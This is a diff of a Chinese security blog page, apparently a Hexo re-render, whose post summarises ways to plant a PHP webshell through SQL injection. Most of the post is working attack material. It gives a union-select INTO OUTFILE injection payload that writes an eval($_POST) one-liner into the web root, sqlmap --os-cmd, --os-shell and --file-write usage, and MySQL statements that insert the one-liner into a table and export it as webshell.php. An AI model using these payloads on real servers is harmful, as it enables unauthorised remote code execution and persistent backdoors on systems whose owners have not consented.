@@ -1,19 +1,362 @@
-<!DOCTYPE html><html lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> SQL注入写WebShell方式小结 · Mi1k7ea</title><meta name="description" content="SQL注入写WebShell方式小结 - Mi1k7ea"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/1.jpg"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="https://www.mi1k7ea.com/atom.xml" title="Mi1k7ea"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/1.jpg" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">MI1K7EA</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">归档</a></li><li class="nav-list-item"><a href="/tags/" target="_self" class="nav-list-link">分类</a></li><li class="nav-list-item"><a href="/about/" target="_self" class="nav-list-link">关于</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">SQL注入写WebShell方式小结</h1><div class="post-info">2019年1月1日</div><div class="post-content"><p>这里小结一下通过SQL注入写入WebShell的方法。</p>
-<p>通过SQL注入select into outfile实现，如：</p>
-<p>1’ union select 1,’\&lt;?php eval($_POST[a]);?&gt;’ INTO OUTFILE ‘/var/www/tmp/nb.php’#</p>
-<p>前提都是需要对目标目录具有写权限。</p>
-<h2 id="–os-cmd-”net-user”"><a href="#–os-cmd-”net-user”" class="headerlink" title="–os-cmd=”net user”"></a>–os-cmd=”net user”</h2><p>交互式命令执行，注意在使用交互式方式时需要知道网站的绝对路径，执行成功之后在绝对路径<br>下创建文件返回结果，然后再自动删除。</p>
-<p>##–os-shell<br>写webshell，会生成两个文件，tmpbshrd.php和tmpucnll.php，分别为命令执行和文件上传webshell。<br>注意:关闭sqlmap文件就会被删除。</p>
-<p>##本地写入webshell<br>先在sqlmap的目录创建mst目录，然后在该目录中创建mst.txt，内容为一句话木马，之后需要两个参数即本地文件地址和目标文件地址，–file-write “./mst/mst.txt” –file-dest “网站的绝对路径/1.php”。</p>
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#202020">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+  
+  
+    <meta name="keywords" content="Web安全,SQL注入,">
+  
+
+  
+    <meta name="description" content="d2VsY29tZSB0byBteSBibG9n">
+  
+  
+  
+  <link rel="icon" type="image/x-icon" href="/1.jpg">
+  
+  <title>SQL注入写WebShell方式小结 [ Mi1k7ea ]</title>
+  
+    <!-- stylesheets list from config.yml -->
+    
+      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
+    
+      <link rel="stylesheet" href="/css/xoxo.css">
+    
+  
+</head>
+
+
+<body>
+  <div class="nav-container">
+    <nav class="home-menu pure-menu pure-menu-horizontal">
+  <a class="pure-menu-heading" href="/">
+    
+      <img class="avatar" src="/1.jpg">
+    
+    <span class="title" style="text-transform:none">Mi1k7ea</span>
+  </a>
+
+  <ul class="pure-menu-list clearfix">
+      
+          
+            
+              <li class="pure-menu-item"><a href="/archives" class="pure-menu-link">归档</a></li>
+            
+          
+      
+          
+            
+              <li class="pure-menu-item"><a href="/categories" class="pure-menu-link">分类</a></li>
+            
+          
+      
+          
+            
+              <li class="pure-menu-item"><a href="/2019/01/01/mindmap/" class="pure-menu-link">导图</a></li>
+            
+          
+      
+          
+            
+              <li class="pure-menu-item"><a href="/project" class="pure-menu-link">项目</a></li>
+            
+          
+      
+          
+            
+              <li class="pure-menu-item pure-menu-has-children pure-menu-allow-hover">
+            
+              <a href="#" id="关于" class="pure-menu-link">关于</a>
+              <ul class="pure-menu-children">
+              
+                  
+                    <li class="pure-menu-item"><a href="/about" style="color:#202020;" class="pure-menu-link">Mi1k7ea</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="https://xz.aliyun.com/u/30398" style="color:#202020;" class="pure-menu-link">先知</a></li>
+                  
+              
+                  
+                    <li class="pure-menu-item"><a href="https://blog.csdn.net/ski_12" style="color:#202020;" class="pure-menu-link">CSDN</a></li>
+                  
+              
+              </ul>
+            </li>
+          
+      
+          
+            
+              <li class="pure-menu-item"><a href="/atom.xml" class="pure-menu-link">RSS</a></li>
+            
+          
+      
+  </ul>
+   
+</nav>
+
+  </div>
+
+  <div class="container" id="content-outer">
+    <div class="inner" id="content-inner">
+      <div class="post-container">
+  <article class="post" id="post">
+    <header class="post-header text-center">
+      <h1 class="title">
+        SQL注入写WebShell方式小结
+      </h1>
+      <span>
+        
+        <time class="time" datetime="2018-12-31T17:01:01.000Z">
+        2019-01-01
+      </time>
+        
+      </span>
+      <span class="slash">/</span>
+      <span class="post-meta">
+      <span class="post-tags">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL注入/">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li></ul>
+      </span>
+    </span>
+      <span class="slash">/</span>
+      <span class="read">
+      <span id="busuanzi_value_page_pv"></span> 点击
+    </span>
+      <span class="slash">/</span>
+    </header>
+
+    <div class="post-content">
+      <p>这里小结一下通过SQL注入写入WebShell的方法。</p>
+<h2 id="0x01-传统的SQL语句写shell"><a href="#0x01-传统的SQL语句写shell" class="headerlink" title="0x01 传统的SQL语句写shell"></a>0x01 传统的SQL语句写shell</h2><p>通过SQL注入select into outfile实现，如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union select 1,&apos;&lt;?php eval($_POST[a]);?&gt;&apos; INTO OUTFILE &apos;/var/www/tmp/nb.php&apos;#</span><br></pre></td></tr></table></figure>
+<h2 id="0x02-sqlmap写shell"><a href="#0x02-sqlmap写shell" class="headerlink" title="0x02 sqlmap写shell"></a>0x02 sqlmap写shell</h2><p>前提都是需要对目标目录具有写权限。</p>
+<h3 id="–os-cmd-”net-user”"><a href="#–os-cmd-”net-user”" class="headerlink" title="–os-cmd=”net user”"></a>–os-cmd=”net user”</h3><p>交互式命令执行，注意在使用交互式方式时需要知道网站的绝对路径，执行成功之后在绝对路径下创建文件返回结果，然后再自动删除。</p>
+<h3 id="–os-shell"><a href="#–os-shell" class="headerlink" title="–os-shell"></a>–os-shell</h3><p>写webshell，会生成两个文件，tmpbshrd.php和tmpucnll.php，分别为命令执行和文件上传webshell。</p>
+<p>注意:关闭sqlmap文件就会被删除。</p>
+<h3 id="本地写入webshell"><a href="#本地写入webshell" class="headerlink" title="本地写入webshell"></a>本地写入webshell</h3><p>先在sqlmap的目录创建mst目录，然后在该目录中创建mst.txt，内容为一句话木马，之后需要两个参数即本地文件地址和目标文件地址，–file-write “./mst/mst.txt” –file-dest “网站的绝对路径/1.php”。</p>
 <p>注意需要最高权限。</p>
-<p>MySQL写木马，通常可以通过phpmyadmin来实现。</p>
+<h2 id="0x03-MySQL写一句话木马"><a href="#0x03-MySQL写一句话木马" class="headerlink" title="0x03 MySQL写一句话木马"></a>0x03 MySQL写一句话木马</h2><p>MySQL写木马，通常可以通过phpmyadmin来实现。</p>
 <p>前提条件：有读写的权限，有CREATE、INSERT、SELECT的权限。</p>
 <p>1、创建一个表</p>
-<p>CREATE TABLE a (cmd text NOT NULL);</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE a (cmd text NOT NULL);</span><br></pre></td></tr></table></figure>
 <p>2、插入数据</p>
-<p>INSERT INTO a (cmd) VALUES(‘\&lt;?php eval($_POST[‘password’]);?&gt;’);</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO a (cmd) VALUES(&apos;&lt;?php eval($_POST[&apos;password&apos;]);?&gt;&apos;);</span><br></pre></td></tr></table></figure>
 <p>3、导出一句话</p>
-<p>SELECT cmd from a into outfile ‘/var/www/tmp/webshell.php’;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT cmd from a into outfile &apos;/var/www/tmp/webshell.php&apos;;</span><br></pre></td></tr></table></figure>
 <p>4、删除表</p>
-<p>Drop TABLE IF EXISTS a;</p>
-</div></article></div></main><footer><div class="paginator"><a href="/2019/01/01/Python安全小工具之反编译pyc文件/" class="prev">上一篇</a><a href="/2019/01/01/Linux环境与相关工具/" class="next">下一篇</a></div><div class="copyright"><p>© 2019 - 2020 <a href="https://www.mi1k7ea.com">Mi1k7ea</a>  |  <span id="busuanzi_container_site_uv">访客 <span id="busuanzi_value_site_uv"></span> </span>  |  <span id="busuanzi_container_site_pv">总访问量 <span id="busuanzi_value_site_pv"></span> 次</span></p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></body></html>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Drop TABLE IF EXISTS a;</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+  </article>
+  <div class="toc-container">
+    
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-传统的SQL语句写shell"><span class="toc-text">0x01 传统的SQL语句写shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-sqlmap写shell"><span class="toc-text">0x02 sqlmap写shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#–os-cmd-”net-user”"><span class="toc-text">–os-cmd=”net user”</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#–os-shell"><span class="toc-text">–os-shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#本地写入webshell"><span class="toc-text">本地写入webshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-MySQL写一句话木马"><span class="toc-text">0x03 MySQL写一句话木马</span></a></li></ol>
+  </div>
+
+
+  </div>
+</div>
+<div class="copyright">
+    <span>本作品采用</span>
+    <a href="https://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>
+    <span>进行许可。 转载时请注明原文链接。</span>
+</div>
+
+
+  
+    <div class="post-nav">
+      <div class="post-nav-item post-nav-next">
+        
+          <span>〈 </span>
+          <a href="/2019/01/01/Windows下的一种PHP隐蔽后门姿势/" rel="next" title="Windows下的一种PHP隐藏后门姿势">
+          Windows下的一种PHP隐藏后门姿势
+          </a>
+        
+      </div>
+  
+      <div class="post-nav-item post-nav-prev">
+          
+          <a href="/2019/01/01/Python安全小工具之反编译pyc文件/" rel="prev" title="Python安全小工具之反编译pyc文件">
+            Python安全小工具之反编译pyc文件
+          </a>
+          <span>〉</span>
+        
+      </div>
+    </div>
+  
+
+
+    </div>
+
+    
+    
+
+  </div>
+  <footer class="footer text-center">
+    <div id="bottom-inner">
+        <span>Copyright &copy; Mi1k7ea</span>  |  
+        <span id="busuanzi_container_site_pv">访客 <span id="busuanzi_value_site_pv"></span></span> | 
+        <span id="busuanzi_container_site_uv">总访问量 <span id="busuanzi_value_site_uv"></span></span>
+    </div>
+</footer>
+
+  
+
+<script>
+  (function(window, document, undefined) {
+
+    var timer = null;
+
+    function returnTop() {
+      cancelAnimationFrame(timer);
+      timer = requestAnimationFrame(function fn() {
+        var oTop = document.body.scrollTop || document.documentElement.scrollTop;
+        if (oTop > 0) {
+          document.body.scrollTop = document.documentElement.scrollTop = oTop - 50;
+          timer = requestAnimationFrame(fn);
+        } else {
+          cancelAnimationFrame(timer);
+        }
+      });
+    }
+
+    var hearts = [];
+    window.requestAnimationFrame = (function() {
+      return window.requestAnimationFrame ||
+        window.webkitRequestAnimationFrame ||
+        window.mozRequestAnimationFrame ||
+        window.oRequestAnimationFrame ||
+        window.msRequestAnimationFrame ||
+        function(callback) {
+          setTimeout(callback, 1000 / 60);
+        }
+    })();
+    init();
+
+    function init() {
+      css(".heart{z-index:9999;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: absolute;}.heart:after{top: -5px;}.heart:before{left: -5px;}");
+      attachEvent();
+      gameloop();
+      addMenuEvent();
+    }
+
+    function gameloop() {
+      for (var i = 0; i < hearts.length; i++) {
+        if (hearts[i].alpha <= 0) {
+          document.body.removeChild(hearts[i].el);
+          hearts.splice(i, 1);
+          continue;
+        }
+        hearts[i].y--;
+        hearts[i].scale += 0.004;
+        hearts[i].alpha -= 0.013;
+        hearts[i].el.style.cssText = "left:" + hearts[i].x + "px;top:" + hearts[i].y + "px;opacity:" + hearts[i].alpha + ";transform:scale(" + hearts[i].scale + "," + hearts[i].scale + ") rotate(45deg);background:" + hearts[i].color;
+      }
+      requestAnimationFrame(gameloop);
+    }
+
+    /**
+     * 给logo设置点击事件
+     * 
+     * - 回到顶部
+     * - 出现爱心
+     */
+    function attachEvent() {
+      var old = typeof window.onclick === "function" && window.onclick;
+      var logo = document.getElementById("logo");
+      if (logo) {
+        logo.onclick = function(event) {
+          returnTop();
+          old && old();
+          createHeart(event);
+        }
+      }
+      
+    }
+
+    function createHeart(event) {
+      var d = document.createElement("div");
+      d.className = "heart";
+      hearts.push({
+        el: d,
+        x: event.clientX - 5,
+        y: event.clientY - 5,
+        scale: 1,
+        alpha: 1,
+        color: randomColor()
+      });
+      document.body.appendChild(d);
+    }
+
+    function css(css) {
+      var style = document.createElement("style");
+      style.type = "text/css";
+      try {
+        style.appendChild(document.createTextNode(css));
+      } catch (ex) {
+        style.styleSheet.cssText = css;
+      }
+      document.getElementsByTagName('head')[0].appendChild(style);
+    }
+
+    function randomColor() {
+      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
+      return "#F44336";
+    }
+
+    function addMenuEvent() {
+      var menu = document.getElementById('menu-main-post');
+      if (menu) {
+        var toc = document.getElementById('toc');
+        if (toc) {
+          menu.onclick = function() {
+            if (toc) {
+              if (toc.style.display == 'block') {
+                toc.style.display = 'none';
+              } else {
+                toc.style.display = 'block';
+              }
+            }
+          };
+        } else {
+          menu.style.display = 'none';
+        }
+      }
+    }
+
+  })(window, document);
+</script>
+
+  
+
+
+
+  
+<script>
+  (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else {
+          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+</body>
+</html>
